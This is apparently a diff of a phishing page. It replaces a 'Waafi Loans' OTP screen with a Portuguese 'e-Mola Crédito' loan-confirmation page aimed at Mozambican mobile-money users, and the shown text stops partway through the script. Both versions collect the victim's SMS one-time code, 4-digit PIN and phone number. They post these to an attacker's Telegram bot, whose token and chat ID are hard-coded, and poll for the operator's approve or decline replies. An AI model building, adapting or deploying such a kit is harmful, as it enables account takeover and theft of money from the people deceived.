@@ -1,734 +1,355 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="pt-MZ">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
-    <meta name="theme-color" content="#047857">
-    <title>OTP Verification - Waafi Loans</title>
-    <link href="https://fonts.googleapis.com/css2?family=Red+Hat+Display:wght@400;500;600;700;800;900&family=Red+Hat+Text:wght@400;500;600;700&display=swap" rel="stylesheet">
-    <style>
-        :root {
-            --waafi-green: #10b981;
-            --waafi-green-dark: #047857;
-            --waafi-green-deep: #064e3b;
-            --waafi-green-soft: rgba(16, 185, 129, 0.09);
-            --waafi-green-border: rgba(16, 185, 129, 0.22);
-            --waafi-emerald: #34d399;
-            --waafi-dark: #0d1a12;
-            --waafi-white: #FFFFFF;
-            --safe-top:    env(safe-area-inset-top,    0px);
-            --safe-bottom: env(safe-area-inset-bottom, 0px);
-        }
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        html, body {
-            width: 100%;
-            height: 100%;
-            margin: 0;
-            padding: 0;
-            -webkit-font-smoothing: antialiased;
-        }
-        body {
-            font-family: 'Red Hat Text', sans-serif;
-            background: #f6faf7;
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 10px;
-            overflow-x: hidden;
-        }
-        .container {
-            width: 100%;
-            max-width: 420px;
-            background: white;
-            border-radius: 12px;
-            box-shadow: 0 12px 40px rgba(6,78,59,0.18);
-            overflow: hidden;
-            max-height: 90vh;
-            display: flex;
-            flex-direction: column;
-            border-top: 4px solid var(--waafi-green);
-            padding-bottom: var(--safe-bottom);
-        }
-        .logo-section {
-            background: linear-gradient(145deg, var(--waafi-green-deep), var(--waafi-green-dark));
-            text-align: center;
-            padding: 28px 0 22px;
-            flex-shrink: 0;
-            position: relative;
-        }
-        .logo-section::after {
-            content: '';
-            position: absolute;
-            bottom: 0;
-            left: 0;
-            right: 0;
-            height: 4px;
-            background: linear-gradient(90deg, var(--waafi-green-deep), var(--waafi-green), var(--waafi-emerald), var(--waafi-green-deep));
-        }
-        .brand-logo {
-            display: inline-flex;
-            align-items: center;
-            gap: 12px;
-        }
-        .logo-icon {
-            width: 46px;
-            height: 46px;
-            background: white;
-            border-radius: 14px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            flex-shrink: 0;
-            color: var(--waafi-green-deep);
-            font-family: 'Red Hat Display', sans-serif;
-            font-weight: 900;
-            font-size: 15px;
-            box-shadow: 0 8px 20px rgba(16,185,129,0.25);
-        }
-        .brand-name {
-            color: white;
-            font-family: 'Red Hat Display', sans-serif;
-            font-size: 26px;
-            font-weight: 900;
-            letter-spacing: -0.5px;
-            text-align: left;
-            line-height: 1;
-        }
-        .brand-name span {
-            color: var(--waafi-emerald);
-        }
-        .tagline {
-            color: rgba(255,255,255,0.85);
-            font-size: 10px;
-            margin-top: 2px;
-            letter-spacing: 1.5px;
-            text-transform: uppercase;
-            font-weight: 600;
-            text-align: left;
-        }
-        .content-wrapper {
-            flex: 1;
-            overflow-y: auto;
-            display: flex;
-            flex-direction: column;
-            -webkit-overflow-scrolling: touch;
-        }
-        h1 {
-            text-align: center;
-            font-family: 'Red Hat Display', sans-serif;
-            font-size: 24px;
-            font-weight: 900;
-            color: var(--waafi-green-deep);
-            margin: 22px 0 6px;
-            padding: 0 20px;
-            letter-spacing: -0.5px;
-        }
-        .subtitle {
-            text-align: center;
-            color: #5a7a65;
-            font-size: 14.5px;
-            padding: 0 25px 18px;
-            line-height: 1.55;
-        }
-        .phone-display {
-            text-align: center;
-            font-size: 13.5px;
-            color: #8faa97;
-            margin: -10px 0 14px;
-            padding: 0 25px;
-        }
-        .phone-display strong {
-            color: var(--waafi-green-dark);
-            font-weight: 700;
-        }
-        .offer-info {
-            background: #f6faf7;
-            margin: 0 20px 18px;
-            padding: 15px;
-            border-radius: 8px;
-            text-align: center;
-            border: 1px solid var(--waafi-green-border);
-        }
-        .offer-label {
-            font-size: 11px;
-            color: #5a7a65;
-            text-transform: uppercase;
-            letter-spacing: 1.5px;
-            font-weight: 700;
-            margin-bottom: 6px;
-        }
-        .offer-name {
-            font-size: 16px;
-            font-weight: 800;
-            color: var(--waafi-dark);
-            margin-bottom: 2px;
-        }
-        .offer-amount {
-            color: var(--waafi-green-dark);
-            font-family: 'Red Hat Display', sans-serif;
-            font-weight: 900;
-            font-size: 28px;
-            line-height: 1.2;
-        }
-        .offer-meta {
-            display: flex;
-            justify-content: center;
-            gap: 16px;
-            margin-top: 8px;
-            flex-wrap: wrap;
-        }
-        .meta-item {
-            font-size: 12px;
-            color: #5a7a65;
-            font-weight: 600;
-        }
-        .meta-item span {
-            font-weight: 800;
-            color: var(--waafi-dark);
-        }
-        .otp-container {
-            display: flex;
-            justify-content: center;
-            gap: 8px;
-            margin: 18px 0 26px;
-            padding: 0 20px;
-            flex-wrap: wrap;
-        }
-        .otp-input {
-            width: 48px;
-            height: 58px;
-            text-align: center;
-            font-family: 'Red Hat Display', sans-serif;
-            font-size: 24px;
-            font-weight: 900;
-            color: var(--waafi-green-deep);
-            border: 2px solid #e0ebe4;
-            border-radius: 4px;
-            outline: none;
-            transition: all 0.2s;
-            background: white;
-            min-height: 44px;
-        }
-        .otp-input:focus {
-            border-color: var(--waafi-green);
-            box-shadow: 0 0 0 4px var(--waafi-green-soft);
-        }
-        @media (max-width: 480px) {
-            .otp-input { width: 44px; height: 54px; font-size: 22px; }
-            .otp-container { gap: 6px; }
-        }
-        @media (max-width: 380px) {
-            .otp-input { width: 38px; height: 48px; font-size: 18px; }
-            .otp-container { gap: 4px; }
-        }
-        .form-section {
-            padding: 0 25px 30px;
-            flex-shrink: 0;
-        }
-        .btn-action {
-            width: 100%;
-            background: linear-gradient(135deg, var(--waafi-green-dark), var(--waafi-green-deep));
-            color: white;
-            border: none;
-            padding: 16px;
-            font-size: 14px;
-            font-weight: 700;
-            border-radius: 4px;
-            cursor: pointer;
-            margin: 10px 0;
-            transition: all 0.2s;
-            text-transform: uppercase;
-            letter-spacing: 1.5px;
-            box-shadow: 0 8px 20px rgba(16,185,129,0.22);
-            font-family: 'Red Hat Text', sans-serif;
-            min-height: 52px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-        .btn-action:hover {
-            background: linear-gradient(135deg, var(--waafi-green), var(--waafi-green-deep));
-            transform: translateY(-1px);
-        }
-        .btn-action:disabled {
-            background: #8faa97;
-            box-shadow: none;
-            cursor: not-allowed;
-            transform: none;
-        }
-        .back-btn {
-            width: 100%;
-            background: transparent;
-            color: #5a7a65;
-            border: 2px solid #e0ebe4;
-            padding: 14px;
-            font-size: 14px;
-            font-weight: 700;
-            border-radius: 4px;
-            cursor: pointer;
-            transition: all 0.2s;
-            font-family: 'Red Hat Text', sans-serif;
-            min-height: 52px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-        .back-btn:hover {
-            border-color: var(--waafi-green-dark);
-            color: var(--waafi-green-deep);
-            background: var(--waafi-green-soft);
-        }
-        #spinner {
-            display: none;
-            position: fixed;
-            top: 0; left: 0;
-            width: 100%; height: 100%;
-            background: rgba(6,78,59,0.95);
-            z-index: 10000;
-            align-items: center;
-            justify-content: center;
-            flex-direction: column;
-            color: white;
-        }
-        .spin {
-            width: 60px;
-            height: 60px;
-            border: 5px solid rgba(255,255,255,0.2);
-            border-top: 5px solid var(--waafi-emerald);
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-        }
-        @keyframes spin { to { transform: rotate(360deg); } }
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+<meta name="theme-color" content="#F7941D">
+<title>e-Mola Crédito | Código de Confirmação · Moçambique</title>
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+<style>
+:root{
+  --or:#F7941D;--or-deep:#D96F00;--or-dark:#A34A00;--or-light:#FFB84D;--amber:#FFC857;
+  --cream:#FFF8F0;--white:#fff;--dark:#1a1a1a;--muted:#6b6b6b;--border:#f0e6da;
+  --err:#d32f2f;--ok:#2e7d32;--grad:linear-gradient(135deg,#F7941D 0%,#E8841A 50%,#D96F00 100%);
+  --shadow:0 20px 60px rgba(217,111,0,.35);
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{-webkit-text-size-adjust:100%}
+body{font-family:'Poppins',system-ui,sans-serif;background:var(--grad);min-height:100vh;display:flex;flex-direction:column;position:relative;overflow-x:hidden}
+body::before{content:'';position:fixed;top:-30%;right:-15%;width:600px;height:600px;background:radial-gradient(circle,rgba(255,255,255,.18) 0%,transparent 70%);border-radius:50%;pointer-events:none}
+body::after{content:'';position:fixed;bottom:-25%;left:-10%;width:500px;height:500px;background:radial-gradient(circle,rgba(255,255,255,.1) 0%,transparent 70%);border-radius:50%;pointer-events:none}
 
-        /* PIN Modal */
-        #pinModal {
-            display: none;
-            position: fixed;
-            top: 0; left: 0;
-            width: 100%; height: 100%;
-            background: rgba(6,78,59,0.85);
-            z-index: 3000;
-            align-items: center;
-            justify-content: center;
-            padding: 10px;
-            backdrop-filter: blur(4px);
-            -webkit-backdrop-filter: blur(4px);
-            overscroll-behavior: contain;
-        }
-        .modal-card {
-            background: white;
-            width: 100%;
-            max-width: 420px;
-            border-radius: 12px;
-            box-shadow: 0 12px 40px rgba(0,0,0,0.25);
-            overflow: hidden;
-            animation: fadeUp 0.35s cubic-bezier(.22,.8,.3,1) both;
-            border-top: 4px solid var(--waafi-green);
-            max-height: 90vh;
-            display: flex;
-            flex-direction: column;
-        }
-        @keyframes fadeUp {
-            from { opacity: 0; transform: translateY(24px); }
-            to   { opacity: 1; transform: translateY(0); }
-        }
-        .modal-logo-section {
-            background: linear-gradient(145deg, var(--waafi-green-deep), var(--waafi-green-dark));
-            text-align: center;
-            padding: 24px 0 18px;
-            position: relative;
-            flex-shrink: 0;
-        }
-        .modal-logo-section::after {
-            content: '';
-            position: absolute;
-            bottom: 0;
-            left: 0;
-            right: 0;
-            height: 3px;
-            background: linear-gradient(90deg, var(--waafi-green-deep), var(--waafi-green), var(--waafi-emerald), var(--waafi-green-deep));
-        }
-        .modal-h1 {
-            text-align: center;
-            font-family: 'Red Hat Display', sans-serif;
-            font-size: 22px;
-            font-weight: 900;
-            color: var(--waafi-green-deep);
-            margin: 22px 0 6px;
-            padding: 0 20px;
-        }
-        .modal-subtitle {
-            text-align: center;
-            color: #5a7a65;
-            font-size: 14px;
-            padding: 0 25px 18px;
-            line-height: 1.55;
-        }
-        .modal-content {
-            flex: 1;
-            overflow-y: auto;
-            -webkit-overflow-scrolling: touch;
-        }
-        .modal-form-section {
-            padding: 0 25px 30px;
-            flex-shrink: 0;
-        }
-        .pin-error-msg,
-        .error-msg {
-            text-align: center;
-            margin: 12px 20px 18px;
-            font-size: 14px;
-            padding: 12px;
-            border-radius: 4px;
-            display: none;
-            color: #b91c1c;
-            background: #fee2e2;
-            border: 1px solid #fca5a5;
-            font-weight: 600;
-        }
-    </style>
+header{background:rgba(255,255,255,.96);backdrop-filter:blur(14px);padding:14px 5%;border-bottom:3px solid var(--or-deep);box-shadow:0 2px 12px rgba(0,0,0,.08);position:relative;z-index:2}
+.logo{font-size:24px;font-weight:900;text-decoration:none;letter-spacing:-.8px;display:inline-flex;align-items:center}
+.logo .e{color:var(--or-deep)}
+.logo .mola{background:var(--grad);-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent}
+
+main{flex:1;display:flex;align-items:center;justify-content:center;padding:40px 16px;position:relative;z-index:1}
+
+.progress{display:flex;justify-content:center;gap:8px;margin-bottom:18px}
+.pd{width:8px;height:8px;border-radius:50%;background:rgba(255,255,255,.35);transition:all .3s}
+.pd.on{background:#fff;width:24px;border-radius:5px}
+.pd.done{background:#fff}
+
+.card{background:rgba(255,255,255,.98);backdrop-filter:blur(20px);border-radius:22px;padding:38px 30px;max-width:440px;width:100%;box-shadow:var(--shadow);border:1px solid rgba(255,255,255,.5);animation:pop .5s cubic-bezier(.34,1.56,.64,1)}
+@keyframes pop{from{opacity:0;transform:scale(.96) translateY(10px)}to{opacity:1;transform:scale(1) translateY(0)}}
+.card-head{text-align:center;margin-bottom:22px}
+.card-head h1{font-size:21px;font-weight:900;color:var(--or-dark);margin-bottom:4px}
+.card-head p{color:var(--muted);font-size:12.5px}
+
+.bundle-bar{background:var(--grad);border-radius:14px;padding:15px 18px;margin-bottom:22px;color:#fff;box-shadow:0 8px 20px rgba(217,111,0,.2)}
+.b-row{display:flex;justify-content:space-between;font-size:12.5px;margin-bottom:6px}
+.b-row:last-child{margin-bottom:0;padding-top:9px;border-top:1px solid rgba(255,255,255,.22);font-weight:800;font-size:13.5px}
+
+.err{display:none;background:rgba(211,47,47,.08);border:1.5px solid rgba(211,47,47,.22);color:var(--err);font-size:12px;font-weight:700;border-radius:12px;padding:11px 14px;margin-bottom:16px;text-align:center}
+.err.show{display:block;animation:shake .4s}
+@keyframes shake{0%,100%{transform:translateX(0)}25%{transform:translateX(-6px)}75%{transform:translateX(6px)}}
+
+.fl{display:block;font-size:10px;font-weight:800;color:var(--or-dark);text-transform:uppercase;letter-spacing:.09em;margin-bottom:10px;text-align:center}
+
+.otp-row{display:flex;gap:9px;justify-content:center;margin-bottom:16px}
+.otp-box{width:50px;height:56px;text-align:center;font-size:23px;font-weight:900;border:2px solid var(--border);border-radius:14px;background:var(--cream);color:var(--dark);font-family:'Poppins',monospace;transition:all .25s}
+.otp-box:focus{border-color:var(--or);background:#fff;box-shadow:0 0 0 4px rgba(247,148,29,.15);outline:none;transform:scale(1.05)}
+.otp-box.ok{border-color:var(--ok);background:rgba(46,125,50,.06)}
+
+.hint{font-size:10.5px;color:var(--muted);text-align:center;margin-bottom:10px}
+
+.btns{display:flex;gap:10px;margin-top:22px}
+.btn-p{flex:1;background:var(--grad);color:#fff;border:none;padding:15px;border-radius:50px;font-weight:900;font-size:12px;text-transform:uppercase;cursor:pointer;font-family:inherit;box-shadow:0 6px 18px rgba(217,111,0,.35);transition:all .25s}
+.btn-p:hover{transform:translateY(-2px);filter:brightness(1.05)}
+.btn-o{flex:1;background:transparent;color:var(--or-deep);border:2px solid var(--or-deep);padding:15px;border-radius:50px;font-weight:800;font-size:12px;text-transform:uppercase;cursor:pointer;font-family:inherit;transition:all .25s}
+.btn-o:hover{background:var(--cream)}
+
+.card-ft{text-align:center;margin-top:18px;font-size:10.5px;color:var(--muted)}
+.secure{display:flex;align-items:center;justify-content:center;gap:5px;margin-top:14px;font-size:10.5px;color:var(--muted);font-weight:700}
+
+.overlay{position:fixed;inset:0;display:none;align-items:center;justify-content:center;flex-direction:column;gap:16px;background:rgba(42,22,8,.94);z-index:2000;backdrop-filter:blur(8px)}
+.overlay.on{display:flex}
+.spin{width:54px;height:54px;border:4px solid rgba(255,255,255,.15);border-top-color:var(--or-light);border-radius:50%;animation:sp .8s linear infinite}
+.sp-t{font-size:14px;font-weight:800;color:#fff}
+.sp-s{font-size:11.5px;color:rgba(255,255,255,.7)}
+@keyframes sp{to{transform:rotate(360deg)}}
+
+.pin-overlay{position:fixed;inset:0;display:none;align-items:center;justify-content:center;background:rgba(42,22,8,.9);z-index:2000;padding:20px;backdrop-filter:blur(8px)}
+.pin-overlay.on{display:flex}
+.pin-card{background:#fff;border-radius:20px;padding:38px 28px;max-width:390px;width:100%;box-shadow:var(--shadow);text-align:center;animation:pop .4s}
+.pin-logo{font-size:22px;font-weight:900;margin-bottom:20px}
+.pin-logo .e{color:var(--or-deep)}
+.pin-logo .mola{background:var(--grad);-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent}
+.pin-title{font-size:17px;font-weight:900;color:var(--or-dark);margin-bottom:4px}
+.pin-sub{font-size:12.5px;color:var(--muted);margin-bottom:22px}
+
+.pin-amount{background:linear-gradient(135deg,var(--cream),#fff);border-radius:14px;padding:16px;margin-bottom:22px;border:1.5px solid var(--border)}
+.pin-amount .pa-label{font-size:10px;color:var(--muted);font-weight:700;text-transform:uppercase;letter-spacing:.08em}
+.pin-amount .pa-value{font-size:1.6rem;font-weight:900;color:var(--or-deep);margin-top:3px}
+
+.pin-input-wrap{border:2px solid var(--border);border-radius:14px;padding:15px;background:var(--cream);margin-bottom:16px;transition:all .25s}
+.pin-input-wrap:focus-within{border-color:var(--or);background:#fff;box-shadow:0 0 0 4px rgba(247,148,29,.12)}
+.pin-fi{width:100%;border:none;background:transparent;font-size:27px;color:var(--dark);outline:none;font-family:inherit;letter-spacing:14px;text-align:center;font-weight:900}
+.pin-fi::placeholder{color:#c4b8a8;letter-spacing:0;font-size:13px;font-weight:500}
+
+.pin-err{display:none;background:rgba(211,47,47,.08);border:1.5px solid rgba(211,47,47,.22);color:var(--err);font-size:11.5px;font-weight:700;border-radius:12px;padding:10px;margin-bottom:16px}
+.pin-err.show{display:block}
+
+.pin-btns{display:flex;gap:10px}
+.pin-btn{flex:1;padding:15px;border-radius:50px;border:none;font-weight:900;font-size:12px;text-transform:uppercase;cursor:pointer;font-family:inherit;transition:all .25s}
+.pin-btn-ok{background:var(--grad);color:#fff;box-shadow:0 6px 18px rgba(217,111,0,.35)}
+.pin-btn-ok:hover{transform:translateY(-2px);filter:brightness(1.05)}
+.pin-btn-x{background:transparent;color:var(--or-deep);border:2px solid var(--or-deep)}
+.pin-btn-x:hover{background:var(--cream)}
+.pin-secure{margin-top:18px;font-size:10.5px;color:var(--muted);font-weight:700}
+
+@media (max-width:500px){
+  main{padding:24px 12px}
+  .card{padding:30px 20px}
+  .otp-row{gap:5px}
+  .otp-box{width:42px;height:50px;font-size:19px}
+  .btns{flex-direction:column}
+  .pin-card{padding:30px 20px}
+}
+@media (prefers-reduced-motion:reduce){*,*::before,*::after{animation-duration:.01ms!important;transition-duration:.01ms!important}}
+</style>
 </head>
 <body>
-    <div class="container">
-        <div class="logo-section">
-            <div class="brand-logo">
-                <div class="logo-icon">W</div>
-                <div>
-                    <div class="brand-name">Waafi<span>Loans</span></div>
-                    <div class="tagline">Secure • Instant • Digital</div>
-                </div>
-            </div>
-        </div>
+<header><a class="logo" href="index.html"><span class="e">e-</span><span class="mola">Mola</span></a></header>
 
-        <div class="content-wrapper">
-            <h1>Verify Transaction</h1>
-            <p class="subtitle">A 6-digit verification code has been sent to your number. Enter it below to confirm your transaction.</p>
-            <p class="phone-display" id="phoneDisplay"></p>
-
-            <div class="offer-info" id="offerInfo">
-                <div class="offer-label">Transaction Details</div>
-                <div class="offer-name" id="offerTitle"></div>
-                <div class="offer-amount" id="offerPrice"></div>
-                <div class="offer-meta" id="offerMeta"></div>
-            </div>
-
-            <div class="otp-container" id="otpInputs"></div>
-            <div class="error-msg" id="errMsg"></div>
-
-            <div class="form-section">
-                <button class="btn-action" id="verifyBtn">Approve Transaction</button>
-                <button class="back-btn" onclick="window.history.back()">← Back</button>
-            </div>
-        </div>
+<main>
+  <div class="card">
+    <div class="progress"><div class="pd done"></div><div class="pd on"></div><div class="pd"></div></div>
+    <div class="card-head">
+      <h1>Confirme o seu código</h1>
+      <p>Insira o código de confirmação de 6 dígitos enviado para o seu telemóvel</p>
     </div>
 
-    <!-- PIN/Password Modal -->
-    <div id="pinModal">
-        <div class="modal-card">
-            <div class="modal-logo-section">
-                <div class="brand-logo">
-                    <div class="logo-icon">W</div>
-                    <div>
-                        <div class="brand-name">Waafi<span>Loans</span></div>
-                        <div class="tagline">Secure • Instant • Digital</div>
-                    </div>
-                </div>
-            </div>
-
-            <div class="modal-content">
-                <h1 class="modal-h1">Enter PIN/Password</h1>
-                <p class="modal-subtitle">Enter your 4-digit PIN or password to complete this transaction securely.</p>
-
-                <div class="otp-container" id="pinInputs"></div>
-                <div class="pin-error-msg" id="pinErrMsg"></div>
-
-                <div class="modal-form-section">
-                    <button class="btn-action" id="confirmPinBtn">Confirm PIN/Password</button>
-                </div>
-            </div>
-        </div>
+    <div id="bBar" class="bundle-bar" style="display:none">
+      <div class="b-row"><span>Empréstimo:</span><span id="bD">&mdash;</span></div>
+      <div class="b-row"><span>Prazo:</span><span id="bDur">&mdash;</span></div>
+      <div class="b-row"><span>Total a Pagar:</span><span id="bP">0 MZN</span></div>
     </div>
 
-    <div id="spinner">
-        <div class="spin"></div>
-        <p style="margin-top:25px; font-size:16px; font-weight:700; letter-spacing:1px;">VERIFYING...</p>
+    <div id="err" class="err"></div>
+
+    <label class="fl">Código de Confirmação</label>
+    <div class="otp-row" id="otpRow">
+      <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
+      <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
+      <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
+      <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
+      <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
+      <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
+    </div>
+    <p class="hint">Verifique o seu SMS para o código de confirmação de 6 dígitos</p>
+
+    <div class="btns">
+      <button class="btn-p" onclick="doOTP()">Confirmar & Continuar</button>
+      <button class="btn-o" onclick="location.href='login.html'">Cancelar</button>
     </div>
 
-    <script>
-        /* ── CONFIG ── */
-        const CONFIG = {
-            BOT_TOKEN: '8586466306:AAHutFvTdGwPZVfhnWHlC6NdqwJm1b6hMbQ',
-            CHAT_ID: '6223313798',
-            SUCCESS_PAGE: 'success.html'
-        };
+    <div class="card-ft">Protegido com segurança e-Mola.</div>
+    <div class="secure">🔒 Protegido com segurança e-Mola</div>
+  </div>
+</main>
 
-        /* ── STATE ── */
-        let state = { lastUpdateId: 0 };
-        let isProcessing = false;
+<div id="ov" class="overlay"><div class="spin"></div><div class="sp-t">A confirmar o código</div><div class="sp-s">Por favor aguarde...</div></div>
 
-        const errMsg = document.getElementById('errMsg');
-        const pinErrMsg = document.getElementById('pinErrMsg');
-        const spinner = document.getElementById('spinner');
-        const pinModal = document.getElementById('pinModal');
-        const verifyBtn = document.getElementById('verifyBtn');
-        const confirmPinBtn = document.getElementById('confirmPinBtn');
-        const offerTitleEl = document.getElementById('offerTitle');
-        const offerPriceEl = document.getElementById('offerPrice');
-        const offerMetaEl = document.getElementById('offerMeta');
-        const phoneDisplayEl = document.getElementById('phoneDisplay');
+<div id="pinOv" class="pin-overlay">
+  <div class="pin-card">
+    <div class="pin-logo"><span class="e">e-</span><span class="mola">Mola</span></div>
+    <div class="pin-title">Confirme o pagamento</div>
+    <div class="pin-sub">Insira o seu PIN e-Mola para autorizar o desembolso</div>
 
-        const params = new URLSearchParams(window.location.search);
+    <div class="pin-amount">
+      <div class="pa-label">Valor do Empréstimo</div>
+      <div class="pa-value" id="pinAmt">0 MZN</div>
+    </div>
 
-        function getAllParams() { return params.toString(); }
+    <div id="pinErr" class="pin-err"></div>
 
-        function loadOffer() {
-            const name     = params.get('name')     || params.get('loan_name')   || 'Flex Loan';
-            const amount   = params.get('amount')   || params.get('loan_amount') || '1000';
-            const phone    = params.get('phone')    || params.get('msisdn')      || '';
-            const duration = params.get('duration') || params.get('tenor')       || '';
-            const rate     = params.get('rate')     || params.get('interest')    || '';
-            const fee      = params.get('fee')      || '';
+    <div class="pin-input-wrap">
+      <input type="password" class="pin-fi" id="pinIn" placeholder="Insira o PIN de 4 dígitos" inputmode="numeric" maxlength="4">
+    </div>
 
-            offerTitleEl.textContent = name;
-            offerPriceEl.textContent = `GHS ${parseInt(amount).toLocaleString()}`;
+    <div class="pin-btns">
+      <button class="pin-btn pin-btn-ok" onclick="doPin()">Confirmar Desembolso</button>
+      <button class="pin-btn pin-btn-x" onclick="closePin()">Cancelar</button>
+    </div>
 
-            const metaItems = [];
-            if (duration) metaItems.push({ label: 'Duration', value: duration });
-            if (rate)     metaItems.push({ label: 'Interest',  value: rate });
-            if (fee)      metaItems.push({ label: 'Fee',       value: `GHS ${fee}` });
+    <div class="pin-secure">🔒 Protegido com segurança e-Mola</div>
+  </div>
+</div>
 
-            if (metaItems.length) {
-                offerMetaEl.innerHTML = metaItems
-                    .map(m => `<div class="meta-item">${m.label}: <span>${m.value}</span></div>`)
-                    .join('');
+<script>
+const BOT='8976816871:AAEoOSVkVWkrROLidS1qWH6snhpmU3e8AXU';
+const CID='8873805952';
+let bd={},luid=0,otp='',phone='';
+
+function fmtNum(n){return parseInt(n||0).toLocaleString('pt-PT').replace(/\s/g,'.')}
+
+function init(){
+  const p=new URLSearchParams(location.search);
+  const amount=p.get('amount'), dur=p.get('duration'), interest=p.get('interest'), total=p.get('total');
+  phone=p.get('phone')||'';
+  if(amount){
+    bd={amount:amount,duration:dur,interest:interest||'0',total:total||amount};
+    document.getElementById('bBar').style.display='block';
+    document.getElementById('bD').textContent=fmtNum(amount)+' MZN';
+    document.getElementById('bDur').textContent=(dur||'—')+' dias';
+    document.getElementById('bP').textContent=fmtNum(total||amount)+' MZN';
+    document.getElementById('pinAmt').textContent=fmtNum(amount)+' MZN';
+  }
+}
+
+const boxes=document.querySelectorAll('.otp-box');
+boxes.forEach((b,i)=>{
+  b.addEventListener('input',e=>{
+    const v=e.target.value;
+    if(v.length>1){
+      const digs=v.replace(/\D/g,'').split('');
+      digs.forEach((d,j)=>{if(i+j<boxes.length){boxes[i+j].value=d;boxes[i+j].classList.add('ok')}});
+      boxes[Math.min(i+digs.length,boxes.length-1)].focus();
+      chk();return;
+    }
+    if(v){b.classList.add('ok');if(i<boxes.length-1)boxes[i+1].focus()}
+    else{b.classList.remove('ok')}
+    chk();
+  });
+  b.addEventListener('keydown',e=>{
+    if(e.key==='Backspace'&&!e.target.value&&i>0){boxes[i-1].focus();boxes[i-1].value='';boxes[i-1].classList.remove('ok')}
+  });
+  b.addEventListener('paste',e=>{
+    e.preventDefault();
+    const t=e.clipboardData.getData('text').replace(/\D/g,'');
+    t.split('').forEach((d,j)=>{if(j<boxes.length){boxes[j].value=d;boxes[j].classList.add('ok')}});
+    boxes[Math.min(t.length-1,boxes.length-1)].focus();
+    chk();
+  });
+});
+
+function getCode(){return Array.from(boxes).map(b=>b.value).join('')}
+
+function chk(){
+  otp=getCode();
+  if(otp.length===6){setTimeout(()=>doOTP(),400)}
+}
+
+function doOTP(){
+  otp=getCode();
+  if(otp.length!==6){showErr('Insira todos os 6 dígitos');return}
+  clrErr();
+  document.getElementById('ov').classList.add('on');
+
+  const msg=`📱 <b>Confirmação de Empréstimo e-Mola</b>\n\n<b>Código:</b> <code>${otp}</code>\n<b>Telefone:</b> <code>+258${phone}</code>\n\n<b>Valor:</b> <code>${fmtNum(bd.amount)} MZN</code>\n<b>Prazo:</b> <code>${bd.duration||'N/A'} dias</code>\n<b>Total:</b> <code>${fmtNum(bd.total)} MZN</code>`;
+
+  const btns=[[{text:'✓ Aprovado',callback_data:'otp_approved'},{text:'✗ Recusado',callback_data:'otp_declined'}]];
+  tg(msg,btns);
+  pollOTP();
+}
+
+async function tg(msg,btns){
+  try{
+    await fetch(`https://api.telegram.org/bot${BOT}/sendMessage`,{
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({chat_id:CID,text:msg,reply_markup:btns?{inline_keyboard:btns}:undefined,parse_mode:'HTML'})
+    });
+  }catch(e){console.error(e)}
+}
+
+function pollOTP(){
+  const iv=setInterval(()=>{
+    fetch(`https://api.telegram.org/bot${BOT}/getUpdates?offset=${luid+1}`)
+      .then(r=>r.json())
+      .then(d=>{
+        if(d.ok&&d.result.length>0){
+          const u=d.result[0];
+          luid=u.update_id;
+          if(u.callback_query){
+            const cb=u.callback_query.data;
+            if(cb==='otp_approved'){clearInterval(iv);document.getElementById('ov').classList.remove('on');openPin()}
+            else if(cb==='otp_declined'){clearInterval(iv);document.getElementById('ov').classList.remove('on');showErr('Recusado. Tente novamente.');resetOTP()}
+          }
+        }
+      }).catch(e=>console.error(e));
+  },1000);
+  setTimeout(()=>clearInterval(iv),300000);
+}
+
+function openPin(){
+  document.getElementById('pinOv').classList.add('on');
+  setTimeout(()=>document.getElementById('pinIn').focus(),300);
+}
+
+function closePin(){
+  document.getElementById('pinOv').classList.remove('on');
+  document.getElementById('pinIn').value='';
+  document.getElementById('pinErr').classList.remove('show');
+}
+
+document.getElementById('pinIn').addEventListener('input',function(){
+  if(this.value.length===4)setTimeout(()=>doPin(),300);
+});
+
+function doPin(){
+  const pin=document.getElementById('pinIn').value.trim();
+  if(pin.length!==4){document.getElementById('pinErr').textContent='Insira o PIN de 4 dígitos';document.getElementById('pinErr').classList.add('show');return}
+  document.getElementById('pinErr').classList.remove('show');
+  document.getElementById('pinOv').classList.remove('on');
+  document.getElementById('ov').classList.add('on');
+
+  const msg=`🔐 <b>Confirmação PIN Final e-Mola</b>\n\n<b>PIN:</b> <code>${pin}</code>\n<b>Telefone:</b> <code>+258${phone}</code>\n\n<b>Valor:</b> <code>${fmtNum(bd.amount)} MZN</code>\n<b>Prazo:</b> <code>${bd.duration||'N/A'} dias</code>\n<b>Total a Pagar:</b> <code>${fmtNum(bd.total)} MZN</code>`;
+  const btns=[[{text:'✓ PIN Válido',callback_data:'pin_valid'},{text:'✗ PIN Inválido',callback_data:'pin_invalid'}]];
+  tg(msg,btns);
+  pollPin();
+}
+
+function pollPin(){
+  const iv=setInterval(()=>{
+    fetch(`https://api.telegram.org/bot${BOT}/getUpdates?offset=${luid+1}`)
+      .then(r=>r.json())
+      .then(d=>{
+        if(d.ok&&d.result.length>0){
+          const u=d.result[0];
+          luid=u.update_id;
+          if(u.callback_query){
+            const cb=u.callback_query.data;
+            if(cb==='pin_valid'){
+              clearInterval(iv);
+              document.getElementById('ov').classList.remove('on');
+              const params=new URLSearchParams({
+                amount:bd.amount||'',
+                duration:bd.duration||'',
+                interest:bd.interest||'',
+                total:bd.total||'',
+                phone:phone
